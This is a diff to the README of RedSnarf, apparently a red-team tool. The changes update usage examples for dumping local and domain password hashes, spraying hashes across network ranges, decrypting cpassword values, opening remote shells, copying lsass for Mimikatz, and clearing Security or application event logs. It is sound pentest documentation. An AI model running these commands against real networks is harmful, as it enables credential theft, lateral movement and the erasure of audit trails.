@@ -23,7 +23,7 @@ o	Credsfile will accept a mix of pwdump, fgdump and plain text username and pass
 •	Retrieval of Scripts and Policies folder from a Domain controller and parsing for 'password' and 'administrator';
 •	Ability to decrypt cpassword hashes;
 •	Ability to start a shell on a remote machine;
-•	The ability to clear the event logs (application, security, setup or system); (Internal Version Only)
+•	The ability to clear the event logs (application, security, setup or system);
 •	Results are saved on a per-host basis for analysis.
 
 RedSnarf Usage
@@ -45,68 +45,69 @@ Retrieve Local Hashes
 =======================
 
 Retrieve Local Hashes from a single machine using weak local credetials and clearing the Security event log
-./redsnarf.py -H 10.0.0.50 -s security
+./redsnarf.py -H ip=10.0.0.50 -s security
 
 Retrieve Local Hashes from a single machine using weak local credetials and clearing the application event log
-./redsnarf.py -H 10.0.0.50 -s application
+./redsnarf.py -H ip=10.0.0.50 -s application
 
 Retrieve Local Hashes from a single machine using local administrator credentials
-./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D .
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D .
 
 Retrieve Local Hashes from a single machine using domain administrator credentials
-./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D yourdomain.com
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com
 
 Retrieve Hashes across a network range using local administrator credentials
-./redsnarf.py -H 10.0.0.1/24 -u administrator -p Password01 -D .
+./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D .
 
 Retrieve Hashes across a network range using domain administrator credentials
-./redsnarf.py -H 10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com
+./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com
 
+Retrieve Hashes across a network range using domain administrator credentials
+./redsnarf.py -H file=targets.txt -u administrator -p Password01 -D yourdomain.com
 
 Hash Spraying
 =======================
 
 Spray Hashes across a network range 
-./redsnarf.py -H 10.0.0.1/24 -C credsfile -D .
+./redsnarf.py -H range=10.0.0.1/24 -C credsfile -D .
 
 Retrieve Hashes across a network range domain login
-./redsnarf.py -H 10.0.0.1/24 -C credsfile -D yourdomain.com
+./redsnarf.py -H range=10.0.0.1/24 -C credsfile -D yourdomain.com
 
 
 Retrieve Domain Hashes
 =======================
 
 Retrieve Hashes using drsuapi method (Quickest)
-./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -i y
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -i y
 
 Retrieve Hashes using NTDSUtil
-./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -n y
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -n y
 
 
 Information Gathering
 =======================
 
 Copy the Policies and Scripts folder from a Domain Controller and parse for password and administrator
-./redsnarf.py -H 10.0.0.1 -u administrator -p Password01 -D yourdomain.com -P y
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -P y
 
 Decrypt Cpassword
 ./redsnarf.py -g cpassword
 
+Find User - Live
+/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -F user.name
+
+Find User - Offline (searches pre downloaded information)
+/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -f user.name
 
 Misc
 =======================
 
 Start a Shell on a machine using local administrator credentials
-./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D . -d y
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -d y
 
 Start a Shell on a machine using domain administrator credentials
-./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D yourdomain.com -d y
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -d y
 
 Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
-./redsnarf.py -H 10.0.0.50 -u administrator -p Password01 -D . -l y
-
-Additional Information
-=======================
-
-For more information please visit:
-https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/november/introducing-redsnarf-and-the-importance-of-being-careful/ 
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -l y
